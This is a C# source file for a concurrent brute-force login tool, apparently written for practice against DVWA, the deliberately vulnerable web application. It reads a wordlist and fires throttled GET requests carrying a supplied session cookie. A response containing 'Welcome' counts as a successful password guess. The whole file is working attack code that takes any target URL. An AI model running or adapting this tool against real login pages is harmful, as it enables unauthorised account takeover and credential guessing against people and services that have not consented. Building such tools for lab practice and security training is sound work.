using System.Linq;
using System.CommandLine;
using System.CommandLine.Parsing;

namespace BruteForceTool;

internal class Program
{
    private const int DefaultConcurrencyLimit = 20;
    private const int SuccessExitCode = 0;
    private const int ErrorExitCode = 1;

    static async Task Main(string[] args)
    {
        var rootCommand = BuildRootCommand();
        await rootCommand.Parse(args).InvokeAsync();
    }

    private static RootCommand BuildRootCommand()
    {
        var addressOption = new Option<string>("--address", "-a")
        {
            Description = "Target address to test (base URL)"
        };
        addressOption.Required = true;
        
        var fileOption = new Option<FileInfo>("--file", "-f")
        {
            Description = "Path to the wordlist file containing test candidates"
        };
        fileOption.Required = true;
        
        var cookieOption = new Option<string>("--cookie", "-c")
        {
            Description = "Cookie header value for authentication"
        };
        cookieOption.Required = true;
        
        var concurrencyOption = new Option<int>("--concurrency", "-n")
        {
            Description = "Maximum number of concurrent requests",
            DefaultValueFactory = _ => DefaultConcurrencyLimit
        };
        
        var rootCommand = new RootCommand("DVWA Brute Force Testing Tool");
        rootCommand.Options.Add(addressOption);
        rootCommand.Options.Add(fileOption);
        rootCommand.Options.Add(cookieOption);
        rootCommand.Options.Add(concurrencyOption);
        
        rootCommand.SetAction(async (parseResult, cancellationToken) =>
        {
            var targetAddress = parseResult.GetValue(addressOption);
            var wordlistFile = parseResult.GetValue(fileOption);
            var cookie = parseResult.GetValue(cookieOption);
            var concurrencyLimit = parseResult.GetValue(concurrencyOption);

            return await ExecuteBruteForceAsync(
                targetAddress,
                wordlistFile,
                cookie,
                concurrencyLimit,
                cancellationToken);
        });

        return rootCommand;
    }

    private static async Task<int> ExecuteBruteForceAsync(
        string targetAddress,
        FileInfo wordlistFile,
        string cookie,
        int concurrencyLimit,
        CancellationToken cancellationToken)
    {
        try
        {
            var config = new BruteForceConfig
            {
                TargetAddress = targetAddress,
                WordlistPath = wordlistFile.FullName,
                Cookie = cookie,
                ConcurrencyLimit = concurrencyLimit
            };

            var engine = new BruteForceEngine(config);
            var result = await engine.ExecuteAsync(cancellationToken);

            DisplayResults(result);

            return result.IsSuccess ? SuccessExitCode : ErrorExitCode;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Fatal error: {ex.Message}");
            return ErrorExitCode;
        }
    }

    private static void DisplayResults(BruteForceResult result)
    {
        Console.WriteLine();
        Console.WriteLine("=== Brute Force Test Results ===");
        Console.WriteLine($"Total candidates tested: {result.TotalAttempts}");
        Console.WriteLine($"Execution time: {result.ExecutionTime.TotalSeconds:F2}s");

        if (result.IsSuccess)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"✓ Match found: {result.SuccessfulCandidate}");
            Console.ResetColor();
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("✗ No match found");
            Console.ResetColor();
        }

        if (result.Errors.Any())
        {
            Console.WriteLine($"Errors encountered: {result.Errors.Count}");
        }
    }
}

internal sealed class BruteForceConfig
{
    public string TargetAddress { get; init; } = string.Empty;
    public string WordlistPath { get; init; } = string.Empty;
    public string Cookie { get; init; } = string.Empty;
    public int ConcurrencyLimit { get; init; } = 20;
    public string SuccessIndicator { get; init; } = "Welcome";
}

internal sealed class BruteForceResult
{
    public bool IsSuccess { get; init; }
    public string? SuccessfulCandidate { get; init; }
    public int TotalAttempts { get; init; }
    public TimeSpan ExecutionTime { get; init; }
    public IReadOnlyList<string> Errors { get; init; } = Array.Empty<string>();
}

internal sealed class BruteForceEngine : IDisposable
{
    private readonly BruteForceConfig _config;
    private readonly HttpClient _httpClient;
    private readonly List<string> _errors;

    public BruteForceEngine(BruteForceConfig config)
    {
        _config = config ?? throw new ArgumentNullException(nameof(config));
        _httpClient = CreateHttpClient(config.Cookie);
        _errors = new List<string>();
    }
    
    private static HttpClient CreateHttpClient(string cookie)
    {
        var client = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(30)
        };

        client.DefaultRequestHeaders.Add("Cookie", cookie);
        client.DefaultRequestHeaders.Add("User-Agent", "BruteForceTool/1.0");

        return client;
    }

    public async Task<BruteForceResult> ExecuteAsync(CancellationToken cancellationToken)
    {
        var startTime = DateTime.UtcNow;
        var candidates = await LoadCandidatesAsync(_config.WordlistPath);
        
        Console.WriteLine($"Loaded {candidates.Count} candidates from wordlist");
        Console.WriteLine($"Testing against: {_config.TargetAddress}");
        Console.WriteLine($"Concurrency limit: {_config.ConcurrencyLimit}");
        Console.WriteLine();
        
        using var cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        using var throttler = new SemaphoreSlim(_config.ConcurrencyLimit);
        
        string? foundCandidate = null;
        var processedCount = 0;

        var tasks = candidates.Select(async candidate =>
        {
            await throttler.WaitAsync(cts.Token);
            try
            {
                if (cts.Token.IsCancellationRequested)
                {
                    return;
                }

                var isMatch = await TestCandidateAsync(candidate, cts.Token);
                if (isMatch)
                {
                    foundCandidate = candidate;
                    await cts.CancelAsync();
                }

                var current = Interlocked.Increment(ref processedCount);
                if (current % 100 == 0)
                {
                    Console.WriteLine($"Progress: {current}/{candidates.Count} tested");
                }
            }
            catch (OperationCanceledException)
            {
            }
            catch (Exception exception)
            {
                lock (_errors)
                {
                    _errors.Add($"Error testing '{candidate}': {exception.Message}");
                }
            }
            finally
            {
                throttler.Release();
            }
        });

        try
        {
            await Task.WhenAll(tasks);
        }
        catch (OperationCanceledException)
        {
        }
        
        var executionTime = DateTime.UtcNow - startTime;
        return new BruteForceResult
        {
            IsSuccess = foundCandidate != null,
            SuccessfulCandidate = foundCandidate,
            TotalAttempts = processedCount,
            ExecutionTime = executionTime,
            Errors = _errors.AsReadOnly()
        };
    }

    private async Task<bool> TestCandidateAsync(string candidate, CancellationToken cancellationToken)
    {
        var url = $"{_config.TargetAddress}{candidate}&Login=Login";
        var response = await _httpClient.GetAsync(url, cancellationToken);
        response.EnsureSuccessStatusCode();

        var content = await response.Content.ReadAsStringAsync(cancellationToken);
        return content.Contains(_config.SuccessIndicator, StringComparison.OrdinalIgnoreCase);
    }
    
    private static async Task<IReadOnlyList<string>> LoadCandidatesAsync(string filePath)
    {
        var lines = await File.ReadAllLinesAsync(filePath);
        return lines
            .Where(line => !string.IsNullOrWhiteSpace(line))
            .Select(line => line.Trim())
            .ToList();
    }

    public void Dispose()
    {
        _httpClient?.Dispose();
    }
}